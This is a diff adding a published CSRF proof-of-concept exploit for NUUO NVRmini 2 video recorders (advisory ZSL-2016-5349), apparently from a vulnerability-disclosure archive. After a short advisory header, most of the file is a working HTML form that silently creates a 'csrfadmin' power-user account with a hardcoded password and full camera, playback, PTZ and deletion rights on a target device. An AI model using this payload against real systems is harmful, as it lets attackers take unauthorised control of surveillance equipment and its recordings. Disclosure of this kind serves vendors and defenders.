@@ -1,0 +1,66 @@
+﻿<!--
+
+NUUO CSRF Add Admin Exploit
+
+
+Vendor: NUUO Inc.
+Product web page: http://www.nuuo.com
+Affected version: <=3.0.8 (NE-4160, NT-4040)
+
+Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
+functionality. Setup is simple and easy, with automatic port forwarding
+settings built in. NVRmini 2 supports POS integration, making this the perfect
+solution for small retail chain stores. NVRmini 2 also comes full equipped as
+a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
+and RAID functions for data protection. Choose NVR and know that your valuable video
+data is safe, always.
+
+Desc: The application interface allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests. This can be
+exploited to perform certain actions with administrative privileges if a logged-in
+user visits a malicious web site.
+
+
+Tested on: GNU/Linux 3.0.8 (armv7l)
+           GNU/Linux 2.6.31.8 (armv5tel)
+           lighttpd/1.4.28
+           PHP/5.5.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5349
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5349.php
+
+
+14.01.2016
+
+-->
+
+
+<!-- 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 -->
+<html>
+  <body>
+    <form action="http://10.0.0.17/users_xml.php">
+      <input type="hidden" name="&#95;password2" value="admin" />
+      <input type="hidden" name="addusername" value="csrfadmin" />
+      <input type="hidden" name="password" value="admin" />
+      <input type="hidden" name="cmd" value="adduser" />
+      <input type="hidden" name="group" value="poweruser" />
+      <input type="hidden" name="displaygroup" value="power&#32;user" />
+      <input type="hidden" name="magic" value="574" />
+      <input type="hidden" name="liveacc" value="1&#44;2&#44;3&#44;4&#44;5&#44;6&#44;7&#44;8&#44;9&#44;10&#44;11&#44;12&#44;13&#44;14&#44;15&#44;16" />
+      <input type="hidden" name="pbacc" value="1&#44;2&#44;3&#44;4&#44;5&#44;6&#44;7&#44;8&#44;9&#44;10&#44;11&#44;12&#44;13&#44;14&#44;15&#44;16" />
+      <input type="hidden" name="ptzacc" value="1" />
+      <input type="hidden" name="ioacc" value="1" />
+      <input type="hidden" name="backupacc" value="1" />
+      <input type="hidden" name="deleteacc" value="1" />
+      <input type="hidden" name="emapeacc" value="1" />
+      <input type="hidden" name="remotalkacc" value="1" />
+      <input type="hidden" name="logacc" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
